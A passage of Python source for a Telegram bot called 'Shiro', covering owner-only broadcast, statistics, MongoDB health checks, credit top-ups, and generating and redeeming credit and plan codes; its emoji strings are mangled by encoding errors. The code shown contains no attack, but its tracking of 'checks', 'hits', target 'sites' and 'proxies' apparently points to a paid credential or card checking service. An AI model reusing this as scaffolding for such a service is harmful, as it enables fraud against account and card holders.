            f"Ã¢ÂÅ’ Invalid HTML formatting: {error_msg}\n\n"
            "Please ensure all HTML tags are properly closed.\n"
            "Supported tags: <b>, <i>, <u>, <s>, <code>, <pre>, <a>",
            parse_mode=None
        )
        return
    
    coll = _users_coll()
    if coll is None:
        bot.reply_to(message, "Ã¢ÂÅ’ Database not connected.")
        return
    
    status_msg = bot.reply_to(message, "Ã°Å¸â€œÂ¢ Broadcasting message...")
    
    try:
        # Get only users with valid Telegram IDs (integers)
        all_users = list(coll.find({"_id": {"$type": ["int", "long"]}}))
        total_users = len(all_users)
        
        if total_users == 0:
            bot.edit_message_text("Ã¢ÂÅ’ No valid users found.", message.chat.id, status_msg.message_id)
            return
        
        success_count = 0
        failed_count = 0
        blocked_count = 0
        skipped_count = 0
        
        # Send message to each user
        for i, user_doc in enumerate(all_users):
            user_id = user_doc.get("_id")
            if user_id is None:
                skipped_count += 1
                continue
            
            # Double-check it's a valid integer
            if not isinstance(user_id, int):
                skipped_count += 1
                continue
            
            try:
                bot.send_message(user_id, broadcast_text, parse_mode="HTML")
                success_count += 1
                time.sleep(0.05)  # Rate limit: ~20 msgs/sec to avoid 429
            except telebot.apihelper.ApiTelegramException as e:
                error_str = str(e).lower()
                if "retry after" in error_str:
                    # Telegram asks us to slow down
                    import re as _bre
                    m = _bre.search(r'retry after (\d+)', error_str)
                    wait = int(m.group(1)) + 1 if m else 5
                    time.sleep(wait)
                    try:
                        bot.send_message(user_id, broadcast_text, parse_mode="HTML")
                        success_count += 1
                    except Exception:
                        failed_count += 1
                elif "bot was blocked" in error_str or "user is deactivated" in error_str:
                    blocked_count += 1
                elif "chat not found" in error_str:
                    # Invalid user ID, don't spam logs
                    skipped_count += 1
                else:
                    failed_count += 1
                    # Log HTML parsing errors specifically
                    if "can't parse entities" in error_str or "can't find end tag" in error_str:
                        logger.error(f"Broadcast HTML parse error for user {user_id}: {e}")
                    elif DEBUG:
                        print(f"[Broadcast] Failed to send to {user_id}: {e}")
            except Exception as e:
                failed_count += 1
                if DEBUG:
                    print(f"[Broadcast] Error sending to {user_id}: {e}")
            
            # Update status every 10 users
            if (i + 1) % 10 == 0:
                try:
                    bot.edit_message_text(
                        f"Ã°Å¸â€œÂ¢ Broadcasting... {i + 1}/{total_users}",
                        message.chat.id,
                        status_msg.message_id
                    )
                except Exception:
                    pass
        
        # Final report
        report = (
            f"Ã¢Å“â€¦ Broadcast complete!\n\n"
            f"Ã°Å¸â€œÅ  Total users: {total_users}\n"
            f"Ã¢Å“â€¦ Sent: {success_count}\n"
            f"Ã°Å¸Å¡Â« Blocked: {blocked_count}\n"
            f"Ã¢ÂÂ­Ã¯Â¸Â Skipped: {skipped_count}\n"
            f"Ã¢ÂÅ’ Failed: {failed_count}"
        )
        
        bot.edit_message_text(report, message.chat.id, status_msg.message_id)
        
    except Exception as e:
        bot.edit_message_text(f"Ã¢ÂÅ’ Broadcast failed: {str(e)[:200]}", message.chat.id, status_msg.message_id)


@bot.message_handler(commands=["botstats"])
@_crash_safe
def cmd_botstats(message):
    """Show bot statistics (owner only)."""
    _log_cmd(message, "/botstats")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return

    try:
        coll = _users_coll()
        db, chats_coll = _get_mongo()

        if coll is None or db is None:
            bot.reply_to(message, "Ã¢ÂÅ’ Database not connected.")
            return

        status_msg = bot.reply_to(message, _to_bold_sans("FETCHING STATS") + "Ã¢â‚¬Â¦")

        # User statistics (only valid Telegram IDs)
        total_users = coll.count_documents({"_id": {"$type": ["int", "long"]}})

        # Credits + checks + hits in one aggregation (saves 2 DB round-trips)
        _stats_pipeline = [
            {"$match": {"_id": {"$type": ["int", "long"]}}},
            {"$group": {"_id": None,
                        "total_credits": {"$sum": "$credits"},
                        "total_checks": {"$sum": "$total_checks"},
                        "total_hits":   {"$sum": "$total_hits"}}}
        ]
        _stats_result = list(coll.aggregate(_stats_pipeline))
        _sr = _stats_result[0] if _stats_result else {}
        total_credits = _sr.get("total_credits", 0)
        total_checks = _sr.get("total_checks", 0)
        total_hits = _sr.get("total_hits", 0)

        # Chat statistics
        total_chats = chats_coll.count_documents({}) if chats_coll is not None else 0
        chats_with_sites = chats_coll.count_documents({"sites": {"$exists": True, "$ne": []}}) if chats_coll is not None else 0
        chats_with_proxies = chats_coll.count_documents({"proxies": {"$exists": True, "$ne": []}}) if chats_coll is not None else 0

        # Top 5 users by checks
        top_pipeline = [
            {"$match": {"_id": {"$type": ["int", "long"]}, "total_checks": {"$gt": 0}}},
            {"$sort": {"total_checks": -1}},
            {"$limit": 5}
        ]
        top_users = list(coll.aggregate(top_pipeline))
        top_str = ""
        for i, u in enumerate(top_users, 1):
            u_id = u["_id"]
            checks = u.get("total_checks", 0)
            hits = u.get("total_hits", 0)
            top_str += f"\n  {i}. <code>{u_id}</code> Ã¢â‚¬â€ {checks} " + _to_bold_sans("CHECKS") + f", {hits} " + _to_bold_sans("HITS")

        sc = _to_bold_sans
        response = (
            f"<b>{sc('SHIRO BOT STATISTICS')}</b>\n\n"
            f"Ã¢â€“Â¸ <b>{sc('USERS:')}</b> {total_users}\n"
            f"Ã¢â€“Â¸ <b>{sc('TOTAL CREDITS:')}</b> {total_credits}\n"
            f"Ã¢â€“Â¸ <b>{sc('TOTAL CHECKS:')}</b> {total_checks}\n"
            f"Ã¢â€“Â¸ <b>{sc('TOTAL HITS:')}</b> Ã°Å¸â€Â¥ {total_hits}\n\n"
            f"Ã¢â€“Â¸ <b>{sc('CHATS:')}</b> {total_chats}\n"
            f"Ã¢â€“Â¸ <b>{sc('SITES LOADED:')}</b> {chats_with_sites}\n"
            f"Ã¢â€“Â¸ <b>{sc('PROXIES LOADED:')}</b> {chats_with_proxies}"
        )

        if top_str:
            response += f"\n\nÃ°Å¸Ââ€  <b>{sc('TOP USERS:')}</b>{top_str}"

        bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode="HTML")

    except Exception as e:
        if DEBUG:
            import traceback
            traceback.print_exc()
        try:
            bot.reply_to(message, f"Ã¢ÂÅ’ Error getting stats: {str(e)[:200]}")
        except Exception:
            pass


@bot.message_handler(commands=["mongocheck"])
@_crash_safe
def cmd_mongocheck(message):
    """Verify MongoDB connectivity and data integrity (owner only)."""
    _log_cmd(message, "/mongocheck")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return

    sc = _to_bold_sans
    lines = [f"Ã°Å¸â€Â <b>{sc('MONGODB HEALTH CHECK')}</b>\n"]

    # 1) Connection test
    db, chats_coll = _get_mongo()
    users_coll = _users_coll()
    codes_col = _codes_coll()

    if db is None:
        bot.reply_to(message, "Ã¢ÂÅ’ <b>MongoDB NOT connected.</b>\nCheck SHIRO_MONGO_URI in .env", parse_mode="HTML")
        return

    lines.append(f"Ã¢Å“â€¦ <b>{sc('CONNECTION:')}</b> {sc('OK')}\n")

    # 2) Collections check
    try:
        db_collections = db.list_collection_names()
        lines.append(f"Ã°Å¸â€œâ€š <b>{sc('COLLECTIONS:')}</b> {', '.join(db_collections)}\n")
    except Exception as e:
        lines.append(f"Ã¢Å¡Â Ã¯Â¸Â <b>{sc('COLLECTIONS:')}</b> Error: {str(e)[:60]}\n")

    # 3) Users collection
    if users_coll is not None:
        try:
            total_users = users_coll.count_documents({})
            valid_users = users_coll.count_documents({"_id": {"$type": ["int", "long"]}})
            with_username = users_coll.count_documents({"username": {"$exists": True, "$ne": None}})
            with_activity = users_coll.count_documents({"last_active": {"$exists": True}})
            with_checks = users_coll.count_documents({"total_checks": {"$gt": 0}})

            lines.append(f"\nÃ°Å¸â€˜Â¤ <b>{sc('USERS COLLECTION:')}</b>")
            lines.append(f"  Ã¢â€“Â¸ {sc('TOTAL DOCS:')} {total_users}")
            lines.append(f"  Ã¢â€“Â¸ {sc('VALID TELEGRAM IDS:')} {valid_users}")
            lines.append(f"  Ã¢â€“Â¸ {sc('WITH USERNAME:')} {with_username}")
            lines.append(f"  Ã¢â€“Â¸ {sc('WITH LAST_ACTIVE:')} {with_activity}")
            lines.append(f"  Ã¢â€“Â¸ {sc('WITH CHECKS > 0:')} {with_checks}")

            # Sample a user doc to show structure
            sample = users_coll.find_one({"_id": {"$type": ["int", "long"]}})
            if sample:
                keys = sorted(sample.keys())
                lines.append(f"  Ã¢â€“Â¸ {sc('DOC FIELDS:')} {', '.join(keys)}")
        except Exception as e:
            lines.append(f"Ã¢Å¡Â Ã¯Â¸Â Users error: {str(e)[:80]}")
    else:
        lines.append(f"Ã¢ÂÅ’ <b>{sc('USERS:')}</b> Collection not found")

    # 4) Chats collection
    if chats_coll is not None:
        try:
            total_chats = chats_coll.count_documents({})
            with_sites = chats_coll.count_documents({"sites": {"$exists": True, "$ne": []}})
            with_proxies = chats_coll.count_documents({"proxies": {"$exists": True, "$ne": []}})
            lines.append(f"\nÃ°Å¸â€™Â¬ <b>{sc('CHATS COLLECTION:')}</b>")
            lines.append(f"  Ã¢â€“Â¸ {sc('TOTAL:')} {total_chats}")
            lines.append(f"  Ã¢â€“Â¸ {sc('WITH SITES:')} {with_sites}")
            lines.append(f"  Ã¢â€“Â¸ {sc('WITH PROXIES:')} {with_proxies}")
        except Exception as e:
            lines.append(f"Ã¢Å¡Â Ã¯Â¸Â Chats error: {str(e)[:80]}")

    # 5) Codes collection
    if codes_col is not None:
        try:
            total_codes = codes_col.count_documents({})
            unused_codes = codes_col.count_documents({"used_count": {"$lt": 1}})
            lines.append(f"\nÃ°Å¸Å½Å¸Ã¯Â¸Â <b>{sc('CODES COLLECTION:')}</b>")
            lines.append(f"  Ã¢â€“Â¸ {sc('TOTAL:')} {total_codes}")
            lines.append(f"  Ã¢â€“Â¸ {sc('UNUSED:')} {unused_codes}")
        except Exception:
            pass

    # 6) In-memory state
    lines.append(f"\nÃ°Å¸Â§Â  <b>{sc('IN-MEMORY STATE:')}</b>")
    lines.append(f"  Ã¢â€“Â¸ {sc('CACHED USERS:')} {len(_user_cache)}")
    lines.append(f"  Ã¢â€“Â¸ {sc('SITES LOADED:')} {sum(1 for v in user_sites.values() if v)}")
    lines.append(f"  Ã¢â€“Â¸ {sc('PROXIES LOADED:')} {sum(1 for v in user_proxies.values() if v)}")

    # 7) Write test
    try:
        from pymongo import WriteConcern
        test_coll = db.get_collection("_health_check", write_concern=WriteConcern(w=1))
        test_coll.update_one({"_id": "ping"}, {"$set": {"ts": datetime.now(timezone.utc).isoformat()}}, upsert=True)
        test_coll.delete_one({"_id": "ping"})
        lines.append(f"\nÃ¢Å“â€¦ <b>{sc('WRITE TEST:')}</b> {sc('OK')}")
    except Exception as e:
        lines.append(f"\nÃ¢ÂÅ’ <b>{sc('WRITE TEST:')}</b> FAILED Ã¢â‚¬â€ {str(e)[:60]}")

    bot.reply_to(message, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["addcredits"])
@_crash_safe
def cmd_addcredits(message):
    """Add credits to a user (owner only). Usage: /addcredits <user_id> <amount>"""
    _log_cmd(message, "/addcredits", extra=(message.text or "").strip())
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    
    text = (message.text or "").strip()
    parts = text.split()
    
    if len(parts) != 3:
        bot.reply_to(
            message,
            "Usage: /addcredits <user_id> <amount>\n\n"
            "Example: /addcredits 123456789 100",
            parse_mode="HTML"
        )
        return
    
    try:
        target_user_id = int(parts[1])
        amount = int(parts[2])
    except ValueError:
        bot.reply_to(message, "Ã¢ÂÅ’ Invalid user_id or amount. Both must be numbers.")
        return
    
    if amount <= 0:
        bot.reply_to(message, "Ã¢ÂÅ’ Amount must be positive.")
        return
    
    coll = _users_coll()
    if coll is None:
        bot.reply_to(message, "Ã¢ÂÅ’ Database not connected.")
        return
    
    try:
        # Check if user exists
        user_doc = coll.find_one({"_id": target_user_id})
        if not user_doc:
            bot.reply_to(message, f"Ã¢ÂÅ’ User {target_user_id} not found. They need to /register first.")
            return
        
        # Add credits
        result = coll.update_one(
            {"_id": target_user_id},
            {"$inc": {"credits": amount}}
        )
        
        if result.modified_count > 0:
            _invalidate_user_cache(target_user_id)
            new_balance = coll.find_one({"_id": target_user_id})["credits"]
            if DEBUG:
                print(f"[Mongo] Ã¢Å“â€¦ Added {amount} credits to user {target_user_id}, new balance: {new_balance}")
            bot.reply_to(
                message,
                f"Ã¢Å“â€¦ Added {amount} credits to user {target_user_id}\n"
                f"New balance: {new_balance} credits"
            )
            
            # Notify the user
            try:
                bot.send_message(
                    target_user_id,
                    f"Ã°Å¸Å½Â You received {amount} credits!\n"
                    f"Your new balance: {new_balance} credits"
                )
            except Exception:
                pass  # User might have blocked the bot
        else:
            bot.reply_to(message, "Ã¢ÂÅ’ Failed to add credits.")
            
    except Exception as e:
        bot.reply_to(message, f"Ã¢ÂÅ’ Error: {str(e)[:200]}")


@bot.message_handler(commands=["gencode"])
@_crash_safe
def cmd_gencode(message):
    """Generate credit codes (owner only). Usage: /gencode <credits> [count]"""
    _log_cmd(message, "/gencode", extra=(message.text or "").strip())
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    
    text = (message.text or "").strip()
    parts = text.split()
    
    if len(parts) < 2:
        usage_msg = (
            "Ã°Å¸â€œÂ " + _to_bold_sans("USAGE:") + " <code>/gencode &lt;credits&gt; [count]</code>\n\n"
            "Ã°Å¸â€™Â¡ " + _to_bold_sans("EXAMPLES:") + "\n"
            "Ã¢â€“Â¸ <code>/gencode 100</code>\n"
            "  " + _to_bold_sans("CREATES 1 CODE WITH 100 CREDITS") + "\n\n"
            "Ã¢â€“Â¸ <code>/gencode 50 10</code>\n"
            "  " + _to_bold_sans("CREATES 10 CODES, EACH WITH 50 CREDITS") + "\n\n"
            "Ã°Å¸Å½Â¯ " + _to_bold_sans("DEFAULT COUNT:") + " 1"
        )
        bot.reply_to(message, usage_msg, parse_mode="HTML")
        return
    
    try:
        credits = int(parts[1])
        count = int(parts[2]) if len(parts) > 2 else 1
    except ValueError:
        bot.reply_to(message, "Ã¢ÂÅ’ Invalid credits or count. Both must be numbers.")
        return
    
    if credits <= 0 or count <= 0:
        bot.reply_to(message, "Ã¢ÂÅ’ Credits and count must be positive.")
        return
    if count > 50:
        bot.reply_to(message, "Ã¢ÂÅ’ Max 50 codes at once.")
        return
    
    codes = []
    for _ in range(count):
        code = generate_credit_code(credits, 1)
        if code:
            codes.append(code)
    
    if not codes:
        bot.reply_to(message, "Ã¢ÂÅ’ Failed to generate codes. Database error.")
        return
    
    if len(codes) == 1:
        sc = _to_bold_sans
        gen_msg  = f"Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â\n"
        gen_msg += f"   Ã°Å¸Å½Å¸Ã¯Â¸Â <b>{sc('CODE GENERATED')}</b> Ã°Å¸Å½Å¸Ã¯Â¸Â\n"
        gen_msg += f"Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ\n\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('CODE')}</b>       Ã¢Å¾Å“  <code>{codes[0]}</code>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('CREDITS')}</b>    Ã¢Å¾Å“  <b>{credits}</b>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('TYPE')}</b>       Ã¢Å¾Å“  {sc('SINGLE-USE')}\n\n"
        gen_msg += f"  Ã°Å¸â€œâ€¹ <b>{sc('REDEEM:')}</b>\n"
        gen_msg += f"  <code>/redeem {codes[0]}</code>\n\n"
        gen_msg += f"  Ã°Å¸â€™Â¡ {sc('SHARE THIS CODE WITH USERS')}"
    else:
        sc = _to_bold_sans
        total_credits = credits * len(codes)
        code_lines = "\n".join(f"  Ã¢â€“Â¸ <code>{c}</code>" for c in codes)
        gen_msg  = f"Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â\n"
        gen_msg += f"   Ã°Å¸Å½Å¸Ã¯Â¸Â <b>{sc('CODES GENERATED')}</b> Ã°Å¸Å½Å¸Ã¯Â¸Â\n"
        gen_msg += f"Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ\n\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('CREDITS EACH')}</b>  Ã¢Å¾Å“  <b>{credits}</b>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('QUANTITY')}</b>      Ã¢Å¾Å“  <b>{len(codes)}</b>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('TOTAL VALUE')}</b>   Ã¢Å¾Å“  <b>{total_credits}</b> {sc('CREDITS')}\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('TYPE')}</b>          Ã¢Å¾Å“  {sc('SINGLE-USE')}\n\n"
        gen_msg += f"  Ã°Å¸â€œÂ¦ <b>{sc('CODES:')}</b>\n"
        gen_msg += f"{code_lines}\n\n"
        gen_msg += f"  Ã°Å¸â€™Â¡ {sc('USE')} <code>/redeem &lt;CODE&gt;</code> {sc('TO CLAIM')}"
    bot.reply_to(message, gen_msg, parse_mode="HTML")


@bot.message_handler(commands=["gen"])
@_crash_safe
def cmd_gen(message):
    """Generate plan codes (owner only). Usage: /gen <basic|pro> [duration] [count]"""
    _log_cmd(message, "/gen", extra=(message.text or "").strip())
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return

    text = (message.text or "").strip()
    parts = text.split()
    sc = _to_bold_sans

    if len(parts) < 2 or parts[1].lower() not in PLANS:
        usage_msg = (
            "Ã°Å¸â€œÂ " + sc("USAGE:") + " <code>/gen &lt;basic|pro&gt; [duration] [count]</code>\n\n"
            "Ã°Å¸â€™Â¡ " + sc("EXAMPLES:") + "\n"
            "Ã¢â€“Â¸ <code>/gen basic</code> Ã¢â‚¬â€ " + sc("1 CODE, 7 DAYS") + "\n"
            "Ã¢â€“Â¸ <code>/gen pro</code> Ã¢â‚¬â€ " + sc("1 CODE, 30 DAYS") + "\n"
            "Ã¢â€“Â¸ <code>/gen basic 3d</code> Ã¢â‚¬â€ " + sc("3 DAYS") + "\n"
            "Ã¢â€“Â¸ <code>/gen pro 1w 5</code> Ã¢â‚¬â€ " + sc("5 CODES, 1 WEEK EACH") + "\n"
            "Ã¢â€“Â¸ <code>/gen basic 12h</code> Ã¢â‚¬â€ " + sc("12 HOURS") + "\n"
            "Ã¢â€“Â¸ <code>/gen pro 1d12h 3</code> Ã¢â‚¬â€ " + sc("3 CODES, 1.5 DAYS") + "\n\n"
            "Ã¢ÂÂ± " + sc("DURATION: 1w 1d 1h 1m (DEFAULT: PLAN DEFAULT)")
        )
        bot.reply_to(message, usage_msg, parse_mode="HTML")
        return

    plan_key = parts[1].lower()
    plan_info = PLANS[plan_key]
    default_days = plan_info["days"]

    # Parse duration and count
    duration_str = parts[2] if len(parts) > 2 else None
    count_str = parts[3] if len(parts) > 3 else None

    # If duration_str is a pure number, treat as days for backwards compat
    duration_minutes = 0
    if duration_str:
        if duration_str.isdigit():
            duration_minutes = int(duration_str) * 24 * 60
        else:
            duration_minutes = _parse_duration(duration_str)
            if duration_minutes == 0:
                bot.reply_to(message, "Ã¢ÂÅ’ Invalid duration. Use: <code>1w</code>, <code>3d</code>, <code>12h</code>, <code>30m</code>, <code>1d12h</code>", parse_mode="HTML")
                return
    else:
        duration_minutes = default_days * 24 * 60

    # Parse count
    count = 1
    if count_str:
        try:
            count = int(count_str)
        except ValueError:
            bot.reply_to(message, "Ã¢ÂÅ’ Count must be a number.")
            return
    # If only 2 args and second is a number, could be count with default duration
    elif duration_str and duration_str.isdigit() and int(duration_str) > 365:
        # Probably meant count, not days Ã¢â‚¬â€ but keep as days for safety
        pass

    if duration_minutes <= 0 or count <= 0:
        bot.reply_to(message, "Ã¢ÂÅ’ Duration and count must be positive.")
        return
    if count > 20:
        bot.reply_to(message, "Ã¢ÂÅ’ Max 20 plan codes at once.")
        return

    # Format duration for display
    def _fmt_dur(mins):
        if mins >= 7 * 24 * 60 and mins % (7 * 24 * 60) == 0:
            return f"{mins // (7 * 24 * 60)}w"
        d = mins // (24 * 60)
        h = (mins % (24 * 60)) // 60
        m = mins % 60
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m: parts.append(f"{m}m")
        return "".join(parts) or "0m"

    dur_display = _fmt_dur(duration_minutes)

    codes_col = _codes_coll()
    if codes_col is None:
        bot.reply_to(message, "Ã¢ÂÅ’ Database error.")
        return

    codes = []
    for _ in range(count):
        code = secrets.token_urlsafe(12).upper()[:12]
        codes_col.insert_one({
            "code": code,
            "type": "plan",
            "plan": plan_key,
            "duration_minutes": duration_minutes,
            "days": 0,
            "credits": 0,
            "max_uses": 1,
            "used_count": 0,
            "used_by": [],
            "created_at": datetime.now(timezone.utc),
        })
        codes.append(code)

    if len(codes) == 1:
        gen_msg  = f"Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â\n"
        gen_msg += f"   Ã°Å¸â€™Å½ <b>{sc('PLAN CODE GENERATED')}</b> Ã°Å¸â€™Å½\n"
        gen_msg += f"Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ\n\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('CODE')}</b>     Ã¢Å¾Å“  <code>{codes[0]}</code>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('PLAN')}</b>     Ã¢Å¾Å“  <b>{plan_info['name']}</b>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('DURATION')}</b> Ã¢Å¾Å“  <b>{dur_display}</b>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('TYPE')}</b>     Ã¢Å¾Å“  {sc('SINGLE-USE')}\n\n"
        gen_msg += f"  Ã°Å¸â€œâ€¹ <b>{sc('REDEEM:')}</b>\n"
        gen_msg += f"  <code>/redeem {codes[0]}</code>"
    else:
        code_lines = "\n".join(f"  Ã¢â€“Â¸ <code>{c}</code>" for c in codes)
        gen_msg  = f"Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â\n"
        gen_msg += f"   Ã°Å¸â€™Å½ <b>{sc('PLAN CODES GENERATED')}</b> Ã°Å¸â€™Å½\n"
        gen_msg += f"Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ\n\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('PLAN')}</b>     Ã¢Å¾Å“  <b>{plan_info['name']}</b>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('DURATION')}</b> Ã¢Å¾Å“  <b>{dur_display}</b> {sc('EACH')}\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('QUANTITY')}</b> Ã¢Å¾Å“  <b>{len(codes)}</b>\n"
        gen_msg += f"  Ã¢â€“Â¸ <b>{sc('TYPE')}</b>     Ã¢Å¾Å“  {sc('SINGLE-USE')}\n\n"
        gen_msg += f"  Ã°Å¸â€œÂ¦ <b>{sc('CODES:')}</b>\n"
        gen_msg += f"{code_lines}\n\n"
        gen_msg += f"  Ã°Å¸â€™Â¡ {sc('USE')} <code>/redeem &lt;CODE&gt;</code> {sc('TO ACTIVATE')}"
    bot.reply_to(message, gen_msg, parse_mode="HTML")


@bot.message_handler(commands=["redeem"])
@_crash_safe
def cmd_redeem(message):
    """Redeem a credit code. Usage: /redeem <code>"""
    _log_cmd(message, "/redeem")
    uid = getattr(message.from_user, "id", None)
    if not uid or not is_registered(uid):
        register_msg = (
            "Ã¢Å¡Â Ã¯Â¸Â " + _to_bold_sans("REGISTRATION REQUIRED") + "\n\n"
            "Ã°Å¸â€œÂ " + _to_bold_sans("USE") + " /register " + _to_bold_sans("TO GET STARTED") + "\n"
            "Ã°Å¸â€™Â¡ " + _to_bold_sans("OR PRESS REGISTER ON") + " /start"
        )
        bot.reply_to(message, register_msg, parse_mode="HTML")
        return
    
    text = (message.text or "").strip()
    parts = text.split()
    
    if len(parts) != 2:
        usage_msg = (
            "Ã°Å¸â€œÂ " + _to_bold_sans("USAGE:") + " <code>/redeem &lt;code&gt;</code>\n\n"
            "Ã°Å¸â€™Â¡ " + _to_bold_sans("EXAMPLE:") + "\n"
            "Ã¢â€“Â¸ <code>/redeem ABC123XYZ456</code>\n\n"
            "Ã°Å¸Å½Å¸Ã¯Â¸Â " + _to_bold_sans("GET CODES FROM THE BOT OWNER")
        )
        bot.reply_to(message, usage_msg, parse_mode="HTML")
        return
    
    code = parts[1].strip().upper()
    success, msg, credits = redeem_credit_code(uid, code)
    
    if success:
        sc = _to_bold_sans
        # Check if it was a plan code
        if msg.startswith("plan:"):
            _, plan_key, dur_min_str = msg.split(":")
            dur_min = int(dur_min_str)
            plan_name = PLANS.get(plan_key, {}).get("name", plan_key.title())
            # Format duration for display
            d = dur_min // (24 * 60)
            h = (dur_min % (24 * 60)) // 60
            m = dur_min % 60
            dur_parts = []
            if d >= 7 and d % 7 == 0 and h == 0 and m == 0:
                dur_parts.append(f"{d // 7} " + sc("WEEK" if d == 7 else "WEEKS"))
            else:
